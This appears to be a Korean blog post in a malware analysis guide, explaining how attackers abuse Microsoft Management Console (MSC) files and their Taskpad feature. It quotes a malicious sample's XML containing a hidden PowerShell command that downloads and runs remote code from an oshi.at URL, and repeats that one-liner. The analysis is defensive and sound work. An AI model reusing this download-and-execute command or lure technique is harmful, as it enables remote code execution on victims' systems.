---
title: 'π“‘ "MSC", Malware Analysis'
date: 2024-12-09 21:00:00 +0900
categories: [Malware Analysis Guide]
tags: [malware_analysis_guide, msc]
render_with_liquid: false
---



MSC(Microsoft System Center) νμΌμ€ μ‹μ¤ν… κ΄€λ¦¬ λ° λ¨λ‹ν„°λ§μ— μ‚¬μ©λλ” XML ν•μ‹μ νμΌμ…λ‹λ‹¤. Microsoft Management Console(mmc.exe)λ¥Ό μ‚¬μ©ν•΄ μ—΄ μ μμΌλ©°, λ‹¤μ–‘ν• κ΄€λ¦¬ λ„κµ¬μ μ €μ¥ λ° μ‹¤ν–‰μ— μ‚¬μ©λ©λ‹λ‹¤. κ³µκ²©μλ” ν•΄λ‹Ή νμΌμ΄ μ‹μ¤ν…κ³Ό κ΄€λ ¨λ νμΌμ— μ‚¬μ©λλ” ν•μ‹μ„μ„ μ•…μ©ν•μ—¬ μ‚¬μ©μκ°€ μ •μƒ νμΌλ΅ μ°©κ°ν•λ„λ΅ μ λ„ν•©λ‹λ‹¤. 



## <mark>1. MSC νμΌ</mark>

MSC νμΌμ€ μΌλ°μ μΌλ΅ μ‹μ¤ν… κ΄€λ¦¬ λ° λ¨λ‹ν„°λ§μ— μ‚¬μ©λλ” νμΌμ…λ‹λ‹¤. κ³µκ²©μλ” ν•΄λ‹Ή μ‚¬μ‹¤μ„ μ•…μ©ν•μ—¬ μ‚¬μ©μκ°€ μ •μƒ νμΌλ΅ μ°©κ°ν•λ„λ΅ μ λ„ν•©λ‹λ‹¤.

<img src="../images/2024-12-09-MSC-Malware-Analysis/image-20241209220102068.png" alt="image-20241209220102068" style="zoom: 80%;" />

νμΌμ„ μ¤ν”ν•κ² λλ©΄, Microsoft Management Console(mmc.exe)μ— μν•΄ μ‹¤ν–‰λ©λ‹λ‹¤.

<img src="../images/2024-12-09-MSC-Malware-Analysis/IMG-msc λ¶„μ„-20240912113120127-1733738421240-1.png" alt="IMG-msc λ¶„μ„-20240912113120127" style="zoom: 80%;" />

XML ν•μ‹μ„ μ‚¬μ©ν•κΈ° λ•λ¬Έμ— ν…μ¤νΈ μ—λ””ν„°λ¥Ό μ‚¬μ©ν•μ—¬ νμΌ λ‚΄λ¶€λ¥Ό ν™•μΈν•  μ μμµλ‹λ‹¤.

<img src="../images/2024-12-09-MSC-Malware-Analysis/IMG-msc λ¶„μ„-20240912113201295-1733738425481-3.png" alt="IMG-msc λ¶„μ„-20240912113201295" style="zoom:67%;" />



## <mark>2. MMC Console Taskpad</mark>

MSC νμΌμ€ MMC Console Taskpad κΈ°λ¥μ„ μ‚¬μ©ν•μ—¬ λ‚΄λ¶€μ— λ…λ Ήμ–΄λ¥Ό μ‚½μ…ν•  μ μμµλ‹λ‹¤. κ³µκ²©μλ” ν•΄λ‹Ή κΈ°λ¥μ„ μ‚¬μ©ν•μ—¬, μ‚¬μ©μκ°€ νΉμ • λ²„νΌμ„ ν΄λ¦­ν•΄ μ•…μ„± μ¤ν¬λ¦½νΈλ¥Ό μ‹¤ν–‰ν•λ„λ΅ μ λ„ν•©λ‹λ‹¤.

> [!NOTE]   
> π”— [MMC Console Taskpad](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/mmc/mmc-console-taskpad)

![IMG-msc λ¶„μ„-20240912115210945](../images/2024-12-09-MSC-Malware-Analysis/IMG-msc λ¶„μ„-20240912115210945-1733738436425-5.png)

## <mark>3. μ•…μ„± MSC μƒν” λ¶„μ„</mark>

### β– νμΌ λ‚΄λ¶€ ν™•μΈ

MSC νμΌμ€ XML ν•μ‹μ„ μ‚¬μ©ν•κΈ° λ•λ¬Έμ— ν…μ¤νΈ μ—λ””ν„°λ¥Ό μ‚¬μ©ν•΄ λ‚΄λ¶€λ¥Ό ν™•μΈν•  μ μμµλ‹λ‹¤. ConsoleTaskPads κΈ°λ¥μ΄ μ΅΄μ¬ν•λ”μ§€, μ΅΄μ¬ν•λ‹¤λ©΄ μ–΄λ–¤ λ…λ Ήμ–΄λ¥Ό μ‚¬μ©ν•κ³  μλ”μ§€ ν™•μΈν•©λ‹λ‹¤.

![IMG-msc λ¶„μ„-20240912113555178](../images/2024-12-09-MSC-Malware-Analysis/IMG-msc λ¶„μ„-20240912113555178-1733738451950-7.png)

μƒν”μ κ²½μ°, ConsoleTaskpadsμ— Powershell λ…λ Ήμ–΄κ°€ ν¬ν•¨λμ–΄ μλ” κ²ƒμ΄ ν™•μΈλμ—μµλ‹λ‹¤.

```xml
  <ConsoleTaskpads>
    <ConsoleTaskpad ListSize="Medium" IsNodeSpecific="true" ReplacesDefaultView="true" NoResults="true" DescriptionsAsText="true" NodeType="{C96401CE-0E17-11D3-885B-00C04F72C717}" ID="{656F3A6A-1A63-4FC4-9C9B-4B75AF6DF3A3}">
      <String Name="Name" ID="4"/>
      <String Name="Description" Value=""/>
      <String Name="Tooltip" Value=""/>
      <Tasks>
        <Task Type="CommandLine" Command="powershell.exe">
          <String Name="Name" ID="5"/>
          <String Name="Description" ID="11"/>
          <Symbol>
            <Image Name="Small" BinaryRefIndex="6"/>
            <Image Name="Large" BinaryRefIndex="7"/>
          </Symbol>
          <CommandLine Directory="" WindowState="Minimized" Params="-WindowStyle Hidden -Command iex (iwr -Uri 'https://oshi.at/PTgX/jIML.txt' -UseBasicParsing)"/>
        </Task>
      </Tasks>
      <BookMark Name="TargetNode" NodeID="1"/>
    </ConsoleTaskpad>
  </ConsoleTaskpads>
```

### β– λ…λ Ήμ–΄ λ¶„μ„

Powershell μ¤ν¬λ¦½νΈ νμΌλ΅ μ¶”μ •λλ” jIML.txt νμΌμ„ λ‹¤μ΄λ΅λ“ λ°›μ•„ νμΌ λ‚΄λ¶€μ— μλ” μ½”λ“λ¥Ό μ‹¤ν–‰ν•λ” λ…λ Ήμ–΄κ°€ ν¬ν•¨λμ–΄ μλ” κ²ƒμ΄ ν™•μΈλμ—μµλ‹λ‹¤.

```powershell
powershell.exe -WindowStyle Hidden -Command iex (iwr -Uri 'https://oshi.at/PTgX/jIML.txt' -UseBasicParsing)
```

